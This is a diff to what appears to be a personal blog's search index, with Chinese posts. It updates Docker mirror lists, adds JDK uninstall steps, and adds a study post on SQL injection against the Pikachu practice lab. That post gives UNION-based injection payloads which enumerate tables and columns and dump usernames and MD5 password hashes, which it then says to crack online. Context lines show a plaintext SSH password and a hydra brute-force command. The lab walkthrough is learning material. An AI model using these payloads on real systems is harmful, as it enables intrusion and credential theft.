@@ -278,24 +278,9 @@ ansible_ssh_pass=123456 ##密码
       </tags>
   </entry>
   <entry>
-    <title>docker 可用加速镜像2024.08.13</title>
-    <url>/2024/08/13/docker-%E5%8F%AF%E7%94%A8%E9%95%9C%E5%83%8F%E6%BA%902024-08-13/</url>
-    <content><![CDATA[<h2 id="daemon-json"><a href="#daemon-json" class="headerlink" title="daemon.json"></a>daemon.json</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;EOF</span><br><span class="line">&#123;</span><br><span class="line">    &quot;registry-mirrors&quot;: [</span><br><span class="line">        &quot;https://docker.anyhub.us.kg&quot;,</span><br><span class="line">        &quot;https://dockerhub.jobcher.com&quot;,</span><br><span class="line">        &quot;https://dockerhub.icu&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
-
-<p>源自：小锋学长生活大爆炸[xfxuezhagn.cn]<br>原文链接：<a href="https://blog.csdn.net/sxf1061700625/article/details/140895299">https://blog.csdn.net/sxf1061700625/article/details/140895299</a></p>
-]]></content>
-      <categories>
-        <category>系统运维</category>
-        <category>docker</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>docker 可用镜像源加速镜像024.10.13</title>
+    <title>docker 可用镜像源加速镜像025.2.27</title>
     <url>/2024/10/13/docker-%E5%8F%AF%E7%94%A8%E9%95%9C%E5%83%8F%E6%BA%90%E5%8A%A0%E9%80%9F%E9%95%9C%E5%83%8F/</url>
-    <content><![CDATA[<h2 id="2024-10-13测试可用"><a href="#2024-10-13测试可用" class="headerlink" title="2024.10.13测试可用"></a>2024.10.13测试可用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">    &quot;https://registry.docker-cn.com&quot;,</span><br><span class="line">    &quot;http://hub-mirror.c.163.com&quot;,</span><br><span class="line">    &quot;https://docker.mirrors.ustc.edu.cn&quot;,</span><br><span class="line">    &quot;https://dockerhub.azk8s.cn&quot;,</span><br><span class="line">    &quot;https://mirror.ccs.tencentyun.com&quot;,</span><br><span class="line">    &quot;https://registry.cn-hangzhou.aliyuncs.com&quot;,</span><br><span class="line">    &quot;https://docker.mirrors.ustc.edu.cn&quot;,</span><br><span class="line">    &quot;https://docker.1panel.live&quot;,</span><br><span class="line">    &quot;https://atomhub.openatom.cn/&quot;,</span><br><span class="line">    &quot;https://hub.uuuadc.top&quot;,</span><br><span class="line">    &quot;https://docker.anyhub.us.kg&quot;,</span><br><span class="line">    &quot;https://dockerhub.jobcher.com&quot;,</span><br><span class="line">    &quot;https://dockerhub.icu&quot;,</span><br><span class="line">    &quot;https://docker.ckyl.me&quot;,</span><br><span class="line">    &quot;https://docker.awsl9527.cn&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    <content><![CDATA[<h2 id="2025-2-27测试可用"><a href="#2025-2-27测试可用" class="headerlink" title="2025.2.27测试可用"></a>2025.2.27测试可用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">    &quot;https://docker.1ms.run&quot;,</span><br><span class="line">    &quot;https://docker.xuanyuan.me&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h2 id="启用"><a href="#启用" class="headerlink" title="启用"></a>启用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
@@ -1007,7 +992,7 @@ hydra -m cloud -P 密码字典 IP cisco-enable
       </tags>
   </entry>
   <entry>
-    <title>java-linux切换安装版本</title>
+    <title>java-linux安装卸载</title>
     <url>/2025/02/21/java-linux%E5%88%87%E6%8D%A2%E5%AE%89%E8%A3%85%E7%89%88%E6%9C%AC/</url>
     <content><![CDATA[<h2 id="下载jdk"><a href="#下载jdk" class="headerlink" title="下载jdk"></a>下载jdk</h2><ol>
 <li><p>更新</p>
@@ -1025,6 +1010,15 @@ hydra -m cloud -P 密码字典 IP cisco-enable
 <p>根据需要填写编号即可。</p>
 </blockquote>
 </li>
+</ol>
+<h2 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h2><h3 id="查看已有版本"><a href="#查看已有版本" class="headerlink" title="查看已有版本"></a>查看已有版本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dpkg --list | grep -i &quot;jdk\|jre\|java&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="卸载命令"><a href="#卸载命令" class="headerlink" title="卸载命令"></a>卸载命令</h3><ol>
+<li><p>卸载</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt purge openjdk-11-jdk openjdk-11-jre</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>删除多余残余设置</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt autoremove</span><br><span class="line">sudo apt clean</span><br></pre></td></tr></table></figure></li>
 </ol>
 ]]></content>
       <categories>
@@ -1436,6 +1430,51 @@ run
       <tags>
         <tag>工具安装</tag>
         <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入-pikachu-正在学习编辑中.....</title>
+    <url>/2025/02/27/sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><p>使用burp suite工具攻击<br>如果想要去除干扰信息，后面的id&#x3D;1可以改成非法id&#x3D;-2</p>
+<h3 id="获取当前数据库名称和版本"><a href="#获取当前数据库名称和版本" class="headerlink" title="获取当前数据库名称和版本"></a>获取当前数据库名称和版本</h3><ol>
+<li><p>抓包修改参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 union select database(),version()&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
+<p><img src="/images/pasted-92.png" alt="upload successful"></p>
+</li>
+<li><p>可以得出结果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select your userid?</span><br><span class="line"></span><br><span class="line">hello,vince</span><br><span class="line">your email is: vince@pikachu.com</span><br><span class="line"></span><br><span class="line">hello,pikachu</span><br><span class="line">your email is: 5.7.26-0ubuntu0.18.04.1-log</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="获取该数据库表名"><a href="#获取该数据库表名" class="headerlink" title="获取该数据库表名"></a>获取该数据库表名</h3><ol>
+<li><p>修改参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 union select group_concat(table_name),2 from information_schema.tables where table_schema=&#x27;pikachu&#x27;&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select your userid?</span><br><span class="line"></span><br><span class="line">hello,vince</span><br><span class="line">your email is: vince@pikachu.com</span><br><span class="line"></span><br><span class="line">hello,httpinfo,member,message,users,xssblind</span><br><span class="line">your email is: 2</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="查看表users的列名"><a href="#查看表users的列名" class="headerlink" title="查看表users的列名"></a>查看表users的列名</h3><ol>
+<li><p>修改参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 union select group_concat(column_name),2 from information_schema.columns where table_schema=&#x27;pikachu&#x27; and table_name=&#x27;users&#x27;&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select your userid?</span><br><span class="line"></span><br><span class="line">hello,vince</span><br><span class="line">your email is: vince@pikachu.com</span><br><span class="line"></span><br><span class="line">hello,id,username,password,level</span><br><span class="line">your email is: 2</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="查看表users中的账号密码"><a href="#查看表users中的账号密码" class="headerlink" title="查看表users中的账号密码"></a>查看表users中的账号密码</h3><ol>
+<li><p>修改参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 union select group_concat(username),group_concat(password) from users&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select your userid?</span><br><span class="line"></span><br><span class="line">hello,vince</span><br><span class="line">your email is: vince@pikachu.com</span><br><span class="line"></span><br><span class="line">hello,admin,pikachu,test</span><br><span class="line">your email is: e10adc3949ba59abbe56e057f20f883e,670b14728ad9902aecba32e22fa4f6bd,e99a18c428cb38d5f260853678922e03</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="得到的密码进行解码"><a href="#得到的密码进行解码" class="headerlink" title="得到的密码进行解码"></a>得到的密码进行解码</h3><p>随便搜索在线解密<br><img src="/images/pasted-93.png" alt="upload successful"></p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>sql注入</tag>
+        <tag>pikachu</tag>
       </tags>
   </entry>
   <entry>
